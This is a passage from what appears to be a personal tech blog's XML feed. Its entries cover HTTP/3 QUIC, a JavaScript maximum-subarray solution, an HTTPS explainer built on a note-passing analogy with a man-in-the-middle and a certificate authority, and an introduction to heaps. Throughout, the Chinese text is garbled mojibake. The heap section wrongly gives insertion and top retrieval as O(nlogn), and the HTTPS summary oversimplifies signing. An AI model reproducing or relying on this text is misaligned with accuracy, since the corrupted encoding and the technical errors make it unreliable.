è¾“æ•ˆç‡åè€Œæ¯” HTTP/2 è¡¨ç°å¾—æ›´å¥½ã€‚</p><p><br></p><h3 id="HTTP-3-â€”â€”-QUIC"><a href="#HTTP-3-â€”â€”-QUIC" class="headerlink" title="HTTP 3 â€”â€” QUIC"></a>HTTP 3 â€”â€” QUIC</h3><ul><li>å®ç°äº†ç±»ä¼¼ TCP çš„æµé‡æ§åˆ¶ã€ä¼ è¾“å¯é æ€§çš„åŠŸèƒ½ã€‚</li><li>é›†æˆäº† TLS åŠ å¯†åŠŸèƒ½</li><li>å®ç°äº† HTTP/2 ä¸­çš„å¤šè·¯å¤ç”¨åŠŸèƒ½ï¼Œå’Œ TCP ä¸åŒï¼ŒQUIC å®ç°äº†åœ¨åŒä¸€ç‰©ç†è¿æ¥ä¸Šå¯ä»¥æœ‰å¤šä¸ªç‹¬ç«‹çš„é€»è¾‘æ•°æ®æµã€‚å®ç°äº†æ•°æ®æµçš„å•ç‹¬ä¼ è¾“ï¼Œå°±è§£å†³äº† TCP ä¸­é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚</li><li>å®ç°å¿«é€Ÿæ¡æ‰‹</li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’</title>
      <link href="/2021/08/23/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2021/08/23/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      <content type="html"><![CDATA[<h3 id="1-åŠ¨æ€è§„åˆ’-Dynamic-Program"><a href="#1-åŠ¨æ€è§„åˆ’-Dynamic-Program" class="headerlink" title="1. åŠ¨æ€è§„åˆ’ Dynamic Program"></a>1. åŠ¨æ€è§„åˆ’ Dynamic Program</h3><ol><li>dpå…¬å¼: dp[i] = max(nums[i], nums[i] + dp[i-1])</li><li>æœ€å¤§å­åºå’Œ = å½“å‰å…ƒç´ è‡ªèº«æœ€å¤§ï¼Œæˆ–è€… åŒ…å«ä¹‹å‰å…ƒç´ åæœ€å¤§<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    <span class="comment">// nums[i] ä»£è¡¨ dp[i]</span></span><br><span class="line">    nums[i] = <span class="built_in">Math</span>.max(nums[i], nums[i] + nums[i<span class="number">-1</span>])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(...nums)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç®€è¿°ä¸€ä¸‹HTTPS</title>
      <link href="/2021/08/23/HTTPS/"/>
      <url>/2021/08/23/HTTPS/</url>
      <content type="html"><![CDATA[<p>é—ªå®¢å’Œå°å®‡è¦é€šè¿‡ä¼ å­—æ¡çš„æ–¹å¼äº¤æµï¼Œæ€æ ·ä¿è¯çº¸æ¡ä¼ é€’åˆ°ä½ï¼Œä¿¡æ¯ä¸è¢«ç¯¡æ”¹ï¼Œå·çœ‹ï¼Ÿ</p><p><img src="/2021/08/23/HTTPS/2.jpg" style="width: 500px"><br><br></p><h3 id="1-å•é’¥åŒ™é”-å¯¹ç§°åŠ è§£é”"><a href="#1-å•é’¥åŒ™é”-å¯¹ç§°åŠ è§£é”" class="headerlink" title="1. å•é’¥åŒ™é” - å¯¹ç§°åŠ è§£é”"></a>1. å•é’¥åŒ™é” - å¯¹ç§°åŠ è§£é”</h3><p>ç»™ç›’å­é…ä¸€ä¸ªé”å’Œé’¥åŒ™ï¼Œè§£é”éœ€è¦é’¥åŒ™ï¼Œä¸Šé”ä¹Ÿéœ€è¦é’¥åŒ™ã€‚<br>ç”±äºä¸­é—´çš„åŒå­¦æ²¡æœ‰é’¥åŒ™ï¼Œå°±æ— æ³•å·çª¥é‡Œé¢çš„å†…å®¹äº†ï¼Œä¹Ÿæ— æ³•ç¯¡æ”¹é‡Œé¢çš„å†…å®¹ã€‚<br>ä½†æ˜¯å¥½æ™¯ä¸é•¿ï¼Œç”±äºé’¥åŒ™ä¹Ÿæ˜¯é€šè¿‡åŒå­¦ä¼ é€’è¿‡å»çš„ï¼ŒåŒå­¦å·å·å¤åˆ¶äº†ä¸€æŠŠé’¥åŒ™ï¼Œç„¶åæ‹¿ç€é’¥åŒ™ï¼Œå·çœ‹å†…å®¹ï¼Œä¿®æ”¹å†…å®¹ï¼Œæ”¾å›ç›’å­ï¼Œå†æŠŠç›’å­é”èµ·æ¥ã€‚</p><p><img src="/2021/08/23/HTTPS/1.gif" style="width: 100px"><br><br></p><h3 id="2-åŒé’¥åŒ™é”-éå¯¹ç§°åŠ è§£é”-é˜²ç¯¡æ”¹"><a href="#2-åŒé’¥åŒ™é”-éå¯¹ç§°åŠ è§£é”-é˜²ç¯¡æ”¹" class="headerlink" title="2. åŒé’¥åŒ™é” - éå¯¹ç§°åŠ è§£é” - é˜²ç¯¡æ”¹"></a>2. åŒé’¥åŒ™é” - éå¯¹ç§°åŠ è§£é” - é˜²ç¯¡æ”¹</h3><p>ç»™ç›’å­é…ä¸€ä¸ªé”å’Œä¸¤æŠŠä¸åŒçš„é’¥åŒ™ A å’Œ Bï¼Œç”¨é’¥åŒ™ A åŠ é”ï¼Œå¿…é¡»ç”¨é’¥åŒ™ B æ‰èƒ½è§£é”ã€‚åè¿‡æ¥ç”¨é’¥åŒ™ B åŠ é”ï¼Œå¿…é¡»ç”¨é’¥åŒ™ A æ‰èƒ½è§£é”ã€‚<br>æˆ‘æ¯æ¬¡ä¼ å­—æ¡çš„æ—¶å€™ï¼Œå…ˆç”¨é’¥åŒ™AåŠ å¯†ï¼Œç„¶ååˆ°äº†å°å®‡é‚£é‡Œï¼Œä»–ç”¨é’¥åŒ™Bè§£å¯†ï¼Œå°±å¯ä»¥çœ‹åˆ°å†…å®¹äº†ã€‚<br>åäººåªèƒ½ç”¨é’¥åŒ™ B æ‰“å¼€ç›’å­å·çœ‹æˆ‘çš„å†…å®¹ï¼Œä½†æ˜¯ä»–å¦‚æœæƒ³ç¯¡æ”¹å†…å®¹ï¼Œå¿…é¡»ç”¨é’¥åŒ™ A æ‰èƒ½æŠŠç›’å­é”ä½ï¼Œè€Œé’¥åŒ™ A ä¸€ç›´åœ¨æˆ‘æ‰‹é‡Œï¼Œä»æ¥æ²¡æœ‰ä¼ é€’è¿‡ï¼Œæ²¡äººçŸ¥é“ã€‚<br>å½“ç„¶ï¼Œåäººä¹Ÿå¯ä»¥ç”¨é’¥åŒ™ B æŠŠç›’å­é”ä½ï¼Œä½†ç”¨ B é”ä½çš„ç›’å­ï¼Œåªèƒ½ç”¨ A å»è§£é”ï¼Œæ‰€ä»¥å¦‚æœå°å®‡ç”¨è‡ªå·±æ‰‹é‡Œçš„ B è§£é”æ—¶ï¼Œå‘ç°è§£ä¸å¼€ï¼Œå°±çŸ¥é“å†…å®¹è¢«äººç¯¡æ”¹äº†ã€‚</p><p><em>å†…å®¹ç¯¡æ”¹çš„é—®é¢˜è§£å†³äº†ï¼Œä½†æ˜¯å†…å®¹è¢«å·çœ‹çš„é—®é¢˜è¿˜æ²¡è§£å†³ï¼</em></p><p><img src="/2021/08/23/HTTPS/2.gif" style="width: 300px"></p><p><br></p><h3 id="3-å•åŒé’¥åŒ™é”ç›¸äº’é…åˆ"><a href="#3-å•åŒé’¥åŒ™é”ç›¸äº’é…åˆ" class="headerlink" title="3. å•åŒé’¥åŒ™é”ç›¸äº’é…åˆ"></a>3. å•åŒé’¥åŒ™é”ç›¸äº’é…åˆ</h3><p><em>æˆ‘ä»¬å¯ä»¥ç”¨åŒé’¥åŒ™é”çš„å®‰å…¨æ€§ï¼ˆé˜²ç¯¡æ”¹ï¼‰ï¼ŒæŠŠå•é’¥åŒ™é”çš„é’¥åŒ™å®‰å…¨åœ°ä¼ é€ç»™å¯¹æ–¹ï¼Œç„¶åä¹‹åå†ç”¨å•é’¥åŒ™é”ï¼Œé«˜æ•ˆç‡åœ°é€šä¿¡ã€‚</em></p><ol><li>ç”±å°å®‡è®¾è®¡ä¸€ä¸ªåŒé’¥åŒ™é”ï¼Œé…ä¸¤æŠŠé’¥åŒ™ C å’Œ Dï¼Œç„¶åæŠŠé’¥åŒ™ D ç»™æˆ‘ã€‚</li><li>æˆ‘è¿™è¾¹å‡†å¤‡ä¸€ä¸ªå•é’¥åŒ™é”ï¼Œé…ä¸€ä¸ªé’¥åŒ™ Mï¼ŒæŠŠå®ƒæ”¾åœ¨ç›’å­é‡Œï¼Œç”¨å°å®‡ç»™æˆ‘çš„é’¥åŒ™ D åŠ é”ï¼Œä¼ ç»™å°å®‡ã€‚</li><li>ä¼ é€è¿‡ç¨‹ä¸­ï¼Œç”±äºé’¥åŒ™ D åŠ é”çš„ç›’å­åªèƒ½ç”¨é’¥åŒ™ C è§£é”ï¼Œæ‰€ä»¥ä¸­é—´äººæ— æ³•æŸ¥çœ‹å’Œç¯¡æ”¹å†…å®¹ï¼Œæœ€ç»ˆé’¥åŒ™ M è¢«å®‰å…¨ä¼ é€åˆ°å°å®‡é‚£è¾¹ã€‚</li><li>æ­¤æ—¶ï¼Œæˆ‘ä»¬åŒæ–¹éƒ½æœ‰äº†é’¥åŒ™ M å’Œä¸ä¹‹å¯¹åº”çš„å•é’¥åŒ™é”ï¼Œè€Œä¸”è¿™ä¸ªé’¥åŒ™ M è°éƒ½ä¸çŸ¥é“ã€‚</li><li>åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬ç”¨é’¥åŒ™ M å»åŠ å¯†æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œå¯¹æ–¹ç”¨é’¥åŒ™ M è§£å¯†æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œè¾¾æˆäº†å®‰å…¨é€šä¿¡çš„æ¡ä»¶ã€‚</li></ol><p><img src="/2021/08/23/HTTPS/3.jpg" style="width: 500px"></p><p><em>ä½†æ˜¯å¥½æ™¯ä¸é•¿ï¼Œä¸­é—´äººè¿˜æ˜¯æ‰¾åˆ°äº†ç ´è§£æ–¹æ³•</em></p><ol><li>ç”±å°å®‡è®¾è®¡ä¸€ä¸ªåŒé’¥åŒ™é”ï¼Œé…ä¸¤æŠŠé’¥åŒ™ C å’Œ Dï¼Œç„¶åæŠŠé’¥åŒ™ D ç»™æˆ‘ã€‚</li><li>ä¸­é—´äººæ²¡æŠŠé’¥åŒ™ D ç»™æˆ‘ï¼Œè€Œæ˜¯æŠŠè‡ªå·±é€ çš„é’¥åŒ™ Y ç»™äº†æˆ‘ï¼Œä½†æˆ‘ä»¥ä¸ºè¿™æ˜¯å°å®‡ç»™æˆ‘çš„å‘¢ã€‚</li><li>æˆ‘è¿™è¾¹å‡†å¤‡ä¸€ä¸ªå•é’¥åŒ™é”ï¼Œé…ä¸€ä¸ªé’¥åŒ™ Mï¼ŒæŠŠå®ƒæ”¾åœ¨ç›’å­é‡Œï¼Œç”¨å°å®‡ç»™æˆ‘çš„é’¥åŒ™ï¼ˆå…¶å®æ˜¯åè›‹ç»™æˆ‘çš„é’¥åŒ™ Yï¼‰åŠ é”ï¼Œä¼ ç»™å°å®‡ã€‚</li><li>ä¸­é—´äººæ”¶åˆ°åŠ é”åçš„ç›’å­ï¼Œç”¨è‡ªå·±çš„é’¥åŒ™ X è½»æ¾è§£äº†é”ï¼Œå› ä¸ºè¿™ä¸ªé”æ˜¯è¢« Y é”çš„å˜›~è§£é”åå–å‡ºé‡Œé¢çš„é’¥åŒ™ Mï¼Œå¤åˆ¶äº†ä¸€ä»½ï¼Œç„¶åå†ç”¨å°å®‡çš„é’¥åŒ™ D åŠ é”ã€‚</li><li>å°å®‡ç”¨ C è§£å¼€äº†é”ï¼Œå¾—åˆ°é‡Œé¢çš„é’¥åŒ™ Mï¼Œè¿™ä¸ªçš„ç¡®æ˜¯æˆ‘ç»™çš„ï¼Œä½†å°å®‡ä¸çŸ¥é“æ­¤æ—¶å·²ç»è¢«åäººçŸ¥é“äº†ï¼Œä¸æ­¤åŒæ—¶æˆ‘ä¹Ÿä¸çŸ¥é“è¿™ä¸ªäº‹ã€‚</li><li>äºæ˜¯æˆ‘ä»¬ç”¨é’¥åŒ™ M åŠ é”è§£é”é€šä¿¡ï¼Œåè›‹ä¹ŸåŒæ ·ç”¨é’¥åŒ™ M æ¥å·çª¥æˆ–ç¯¡æ”¹æˆ‘ä»¬çš„ä¿¡æ¯ã€‚</li></ol><p><img src="/2021/08/23/HTTPS/4.jpg" style="width: 500px"></p><p><br></p><h3 id="4-ç­é•¿å…¬è¯"><a href="#4-ç­é•¿å…¬è¯" class="headerlink" title="4. ç­é•¿å…¬è¯"></a>4. ç­é•¿å…¬è¯</h3><p><em>æ— è®ºå¦‚ä½•ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¼ è¾“çš„é‚£æŠŠé’¥åŒ™ï¼Œæ˜¯æ— æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œä¼šè¢«ä¸­é—´äººçœ‹åˆ°çš„ï¼Œè¿™æ˜¯æ— æ³•é¿å…çš„ã€‚å½“æ—¶æˆ‘ä»¬èƒ½ä¸èƒ½åšåˆ°ï¼Œè®©å¯¹æ–¹å¯ä»¥çœ‹åˆ°ï¼Œä½†æ˜¯å´æ— æ³•ç¯¡æ”¹ï¼Ÿ</em></p><p>äºæ˜¯æœ‰äº†ç­é•¿ã€‚</p><ol><li><p>ç­é•¿å‡†å¤‡äº†ä¸€ä¸ªåŒé’¥åŒ™é”ï¼Œç„¶åé…ç½®äº†ä¸¤æŠŠé’¥åŒ™ J å’Œ Kï¼Œç„¶åæŠŠé’¥åŒ™ K å…¬å¼€è®©æ‰€æ‰€æœ‰äººéƒ½çŸ¥é“ã€‚</p></li><li><p>å°å®‡åœ¨ç¬¬ä¸€æ¬¡å‡†å¤‡ç»™æˆ‘é’¥åŒ™ D æ—¶ï¼Œä¸å†ç›´æ¥ç»™æˆ‘äº†ï¼Œè€Œæ˜¯æ‰¾ç­é•¿ï¼ŒæŠŠé’¥åŒ™ D æ”¾åœ¨ä¸€ä¸ªç›’å­é‡Œï¼Œè®©ç­é•¿ç”¨è‡ªå·±çš„é’¥åŒ™ J ç»™åŠ é”ã€‚</p></li><li><p>ç„¶åå°å®‡æŠŠè¿™ä¸ªç”¨é’¥åŒ™ J åŠ å¥½é”çš„ç›’å­ä¼ ç»™æˆ‘ï¼Œæˆ‘ç”¨ç­é•¿å…¬å¼€çš„é’¥åŒ™ K è§£é”ç›’å­ï¼Œå°±å¯ä»¥å¾—åˆ°å°å®‡çš„é’¥åŒ™ D äº†ã€‚</p></li></ol><p><img src="/2021/08/23/HTTPS/5.jpg" style="width: 500px"></p><p>ä¸­é—´äººå¯ä»¥ç”¨å…¬å¼€çš„é’¥åŒ™ K æŠŠç›’å­æ‰“å¼€ï¼Œçœ‹åˆ°å°å®‡ç»™æˆ‘å‡†å¤‡çš„é’¥åŒ™ Dã€‚<br>ä½†æ˜¯ä»–ä»¬å´æ— æ³•ä¼ªé€ é’¥åŒ™ Y ä¼ ç»™æˆ‘ï¼Œå› ä¸ºè¦åŠ é”è¿™ä¸ªç›’å­ï¼Œå¿…é¡»è¦æœ‰é’¥åŒ™ Jï¼Œè€Œé’¥åŒ™ J åªæœ‰ç­é•¿çŸ¥é“ã€‚ä¸­é—´äººåªèƒ½çœ‹åˆ°ï¼Œä¸èƒ½ä¿®æ”¹äº†ã€‚</p><p>å¦‚æœä¸èƒ½ä¿®æ”¹ï¼Œæˆ‘å°±èƒ½æˆåŠŸç”¨å°å®‡ç»™æˆ‘çš„çœŸæ­£çš„é’¥åŒ™ D åŠ é”æˆ‘ä»¬ä¹‹åè¦é€šè®¯ç”¨çš„é’¥åŒ™ Mï¼Œäºæ˜¯è¿™ä¸ªé’¥åŒ™ M å°±è¢«å®‰å…¨åœ°ä¼ ç»™äº†å°å®‡ï¼Œæˆ‘ä»¬ä¹‹åå°±å¯ä»¥ç”¨è¿™ä¸ªè°ä¹Ÿä¸çŸ¥é“çš„é’¥åŒ™ Mï¼Œå’Œé…å¥—çš„å•é’¥åŒ™é”ï¼Œæ„‰å¿«åœ°èŠå¤©äº†ï¼</p><p><em>æœ‰é’¥åŒ™çš„ç›’å­åªèƒ½ç”±ç­é•¿ä¸Šé”ï¼Œä¸­é—´äººæ— æ³•ç¯¡æ”¹æœ‰é’¥åŒ™çš„ç›’å­ã€‚</em></p><p><br></p><h3 id="5-æ€»ç»“"><a href="#5-æ€»ç»“" class="headerlink" title="5. æ€»ç»“"></a>5. æ€»ç»“</h3><h4 id="5-1-å¯¹ç§°åŠ å¯†"><a href="#5-1-å¯¹ç§°åŠ å¯†" class="headerlink" title="5.1 å¯¹ç§°åŠ å¯†"></a>5.1 å¯¹ç§°åŠ å¯†</h4><p>å•é’¥åŒ™å°±æ˜¯å¯¹ç§°åŠ å¯†ã€‚å¯¹ç§°åŠ å¯†çš„é€Ÿåº¦å¾ˆå¿«ï¼Œå¯ä»¥ç”¨äºä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®åŠ å¯†ï¼Œé˜²æ­¢ä¸­é—´äººæŸ¥çœ‹å’Œç¯¡æ”¹ä¿¡æ¯ã€‚ä½†æ˜¯å¦‚ä½•å°†å¯¹ç§°åŠ å¯†çš„ç§˜é’¥å®‰å…¨ä¼ é€’è¿‡å»æ˜¯ä¸ªé—®é¢˜ã€‚</p><h4 id="5-2-éå¯¹ç§°åŠ å¯†"><a href="#5-2-éå¯¹ç§°åŠ å¯†" class="headerlink" title="5.2 éå¯¹ç§°åŠ å¯†"></a>5.2 éå¯¹ç§°åŠ å¯†</h4><p>åŒé’¥åŒ™å°±æ˜¯éå¯¹ç§°åŠ å¯†ï¼Œç”¨äºé˜²æ­¢å†…å®¹è¢«ç¯¡æ”¹ã€‚</p><h4 id="5-3-åŠ å¯†"><a href="#5-3-åŠ å¯†" class="headerlink" title="5.3 åŠ å¯†"></a>5.3 åŠ å¯†</h4><p>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼Œè¿™ä¸ªå«åŠ å¯†</p><h4 id="5-4-ç­¾å"><a href="#5-4-ç­¾å" class="headerlink" title="5.4 ç­¾å"></a>5.4 ç­¾å</h4><p>ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†ï¼Œè¿™ä¸ªå«ç­¾åã€‚<br>åˆšåˆšçš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆå°å®‡è®©ç­é•¿ç”¨ç§é’¥ J åŠ å¯†è‡ªå·±çš„å…¬é’¥ Dï¼Œä¼ ç»™æˆ‘ï¼Œè¿™æ˜¯ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ï¼Œè¿™ä¸ªç›®çš„å°±æ˜¯ç­¾åï¼Œé˜²æ­¢å…¬é’¥ D åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«åˆ«äººç¯¡æ”¹ã€‚</p><h4 id="5-5-HTTPSè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#5-5-HTTPSè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="5.5 HTTPSè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>5.5 HTTPSè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h4><p>ç”±äº HTTP å¤©ç”Ÿæ˜æ–‡ä¼ è¾“çš„ç‰¹æ€§ï¼Œåœ¨ HTTP çš„ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œä»»ä½•äººéƒ½æœ‰å¯èƒ½ä»ä¸­æˆªè·ã€ä¿®æ”¹æˆ–è€…ä¼ªé€ è¯·æ±‚å‘é€ï¼Œæ‰€ä»¥å¯ä»¥è®¤ä¸º HTTP æ˜¯ä¸å®‰å…¨çš„ã€‚</p><h4 id="5-6-ç®€è¿°ä¸€ä¸‹HTTPS"><a href="#5-6-ç®€è¿°ä¸€ä¸‹HTTPS" class="headerlink" title="5.6 ç®€è¿°ä¸€ä¸‹HTTPS"></a>5.6 ç®€è¿°ä¸€ä¸‹HTTPS</h4><p>å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†æ­é…ä½¿ç”¨ï¼Œä½¿ç”¨CAæœºæ„å¯¹éå¯¹ç§°åŠ å¯†é’¥åŒ™ç­¾åï¼Œç”¨éå¯¹ç§°æœºå¯†ä¼ è¾“å¯¹ç§°åŠ å¯†çš„é’¥åŒ™ã€‚æˆåŠŸåï¼Œç”¨å¯¹ç§°åŠ å¯†é’¥åŒ™ä¼ è¾“æ•°æ®ã€‚</p><ul><li>æœåŠ¡å™¨é€šè¿‡CAæœºæ„ä¼ é€’åŒé’¥åŒ™ Dï¼Œä¿è¯é’¥åŒ™ D åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ— æ³•è¢«ç¯¡æ”¹ã€‚<br>CAæœºæ„å…ˆå¯¹é’¥åŒ™Dåšç­¾åï¼ˆç”¨ç§é’¥åŠ å¯†ï¼‰ï¼Œå‘é€ç»™å®¢æˆ·ç«¯ï¼Œä¸­é—´äººè™½ç„¶å¯ä»¥è§£å¯†ï¼Œçœ‹åˆ°é’¥åŒ™ Dï¼Œä½†æ˜¯æ²¡åŠæ³•ä¸Šé”ï¼ˆå› ä¸ºç§é’¥åªåœ¨CAæœºæ„ä¸Šæœ‰ï¼‰</li><li>å®¢æˆ·ç«¯æ‹¿åˆ°åŒé’¥åŒ™ Dï¼Œç”¨CAæœºæ„çš„å…¬é’¥è§£å¯†</li><li>å®¢æˆ·ç«¯æ‹¿åŒé’¥åŒ™ Dï¼Œç»™å•é’¥åŒ™ M åŠ å¯†ï¼Œä¼ ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨ç”¨åŒé’¥åŒ™ D è§£å¯†ï¼Œæ‹¿åˆ°å•é’¥åŒ™ M </li><li>ç„¶åæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å°±å¯ä»¥ç”¨å•é’¥åŒ™æ¥è¿›è¡Œäº¤æµ</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://mp.weixin.qq.com/s/M6y37BeiPHM0cy-fl6S8mg" target="_blank" rel="noopener">ç å†œç¿»èº« - ç”¨ HTTPS ä¼ çº¸æ¡</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å †</title>
      <link href="/2021/08/22/Leetcode-%E5%A0%86/"/>
      <url>/2021/08/22/Leetcode-%E5%A0%86/</url>
      <content type="html"><![CDATA[<blockquote><p>å‡è®¾æˆ‘ä»¬æœ‰10 äº¿ä¸ªæœç´¢å…³é”®è¯ï¼Œå¦‚ä½•èƒ½å¿«é€Ÿè·å–åˆ°Top 10çš„å…³é”®è¯å‘¢?<br>å¦‚ä½•å®ç°å®šæ—¶å™¨SetTimeout? æŒ‰ç…§ä»»åŠ¡è®¾å®šçš„æ‰§è¡Œæ—¶é—´ï¼Œå¦‚ä½•å¿«é€Ÿåœ°æ‹¿åˆ°æœ€å…ˆæ‰§è¡Œçš„ä»»åŠ¡ï¼Ÿ<br>å€ŸåŠ©äºå †(Heap)è¿™ç§æ•°æ®ç»“æ„ï¼Œå¿«é€Ÿè·å–æ•°æ®æµä¸­æœ€å¤§å€¼ï¼Œæœ€å°å€¼ã€‚</p></blockquote><p><br></p><h3 id="1-å †-Heap"><a href="#1-å †-Heap" class="headerlink" title="1. å †(Heap)"></a>1. å †(Heap)</h3><p>å †æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ ‘ã€‚åªè¦æ»¡è¶³è¿™ä¸¤ç‚¹ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå †</p><ul><li>å †æ˜¯ä¸€ä¸ªå®Œå…¨äºŒå‰æ ‘ã€‚<br>å®Œå…¨äºŒå‰æ ‘è¦æ±‚ï¼Œé™¤äº†æœ€åä¸€å±‚ï¼Œå…¶ä»–å±‚çš„èŠ‚ç‚¹ä¸ªæ•°éƒ½æ˜¯æ»¡çš„ï¼Œæœ€åä¸€å±‚çš„èŠ‚ç‚¹éƒ½é å·¦æ’åˆ—ã€‚</li><li>å †ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å¿…é¡»å¤§äºç­‰äº(æˆ–å°äºç­‰äº)å…¶å­æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å€¼<br>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å¤§äºç­‰äºå­æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹å€¼çš„å †ï¼Œæˆ‘ä»¬å«åš<strong>å¤§é¡¶å †</strong><br>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å°äºç­‰äºå­æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹å€¼çš„å †ï¼Œæˆ‘ä»¬å«åš<strong>å°é¡¶å †</strong></li></ul><p>å¤§é¡¶å †å’Œå°é¡¶å †ï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ç»“æ„ã€‚å®ƒæ€»æ˜¯ä¿æŒç€å †é¡¶å…ƒç´ æ˜¯æœ€å¤§/æœ€å°çš„ã€‚è¿™é‡Œå‡è®¾æˆ‘ä»¬å·²ç»å®ç°äº†<em>å¤§é¡¶å †</em>å’Œ<em>å°é¡¶å †</em>ï¼Œå®ƒå…è®¸åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œå¯¹æ•°ç»„ä¸­çš„å…ƒç´ è¿›è¡Œå †æ’åºã€‚å‘å †ä¸­æ’å…¥æ–°å…ƒç´ ï¼Œè·å–å †é¡¶å…ƒç´ çš„æ—¶é—´å¤æ‚åº¦åªè¦ O(nlogn)ï¼Œå¹¶ä¸”è¿˜æ˜¯åŸåœ°æ’åºç®—æ³•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®ç°å †çš„ä»£ç åœ¨ä¸‹é¢</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (nums) &#123;&#125; <span class="comment">// æ¥å—ä¸€ä¸ªæ•°ç»„ï¼Œä¸€å¼€å§‹å¯¹numsè¿›è¡Œå †æ’åº</span></span><br><span class="line">  insert (num) &#123;&#125; <span class="comment">// å¾€å †é‡Œæ’å…¥å…ƒç´ </span></span><br><span class="line">  removeMax () &#123;&#125; <span class="comment">// è·å–å †é¡¶å…ƒç´ </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å †çš„åˆå§‹åŒ–ï¼Œæ’å…¥å…ƒç´ ï¼Œè·å–å †é¡¶å…ƒç´ çš„æ–¹æ³•éƒ½æœ‰äº†ã€‚Leetcodeé¢˜å°±æ˜¯ç®€å•åœ°å¯¹æ•°ç»„è¿›è¡Œå †æ’åºï¼Œç„¶åå–å€¼äº†ã€‚</p><p><br></p><h3 id="2-ç›¸å…³LeetCodeé¢˜ç›®"><a href="#2-ç›¸å…³LeetCodeé¢˜ç›®" class="headerlink" title="2. ç›¸å…³LeetCodeé¢˜ç›®"></a>2. ç›¸å…³LeetCodeé¢˜ç›®</h3><p>åŒ…æ‹¬æŸ¥æ‰¾æ•°ç»„ä¸­çš„æœ€å¤§Kä¸ªæ•°ï¼Œæœ€å°Kä¸ªæ•°ã€‚</p><ul><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/215.%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0.md" target="_blank" rel="noopener">215.æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ </a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/692.%E5%89%8DK%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0.md" target="_blank" rel="noopener">347.å‰Kä¸ªé«˜é¢‘å…ƒç´ </a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/692.%E5%89%8DK%E4%B8%AA%E9%AB%98%E9%A2%91%E5%8D%95%E8%AF%8D.md" target="_blank" rel="noopener">692.å‰Kä¸ªé«˜é¢‘å•è¯</a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/Offer40.%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0.md" target="_blank" rel="noopener">Offer40.æœ€å°çš„Kä¸ªæ•°</a> </li></ul><p><br></p><h4 id="Offer40-æœ€å°çš„Kä¸ªæ•°"><a 